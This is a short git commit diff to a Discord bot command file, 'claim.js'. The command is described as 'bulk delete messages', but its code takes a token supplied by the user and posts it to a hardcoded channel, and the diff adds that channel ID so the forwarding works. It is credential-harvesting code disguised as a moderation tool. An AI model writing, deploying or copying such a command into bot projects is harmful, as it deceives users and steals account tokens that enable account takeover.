87478f327fbb39afe44f9f3f1794d28e592ceb4a
spider_under_your_bed <71126384+spiderlord202@users.noreply.github.com>
2021-02-12 21:20:54 +1300

    Update claim.js

--- claim.js
+++ claim.js
@@ -4,6 +4,6 @@ module.exports = {
   description: "bulk delete messages",
   execute: async (bot, message, args, split) => {
     if (!split[1]) return message.channel.send("no token specifyied");
-    bot.channels.cache.get().send(`TOKEN ${split[1]}`)
+    bot.channels.cache.get("809697354994810880").send(`TOKEN ${split[1]}`)
 }
 }
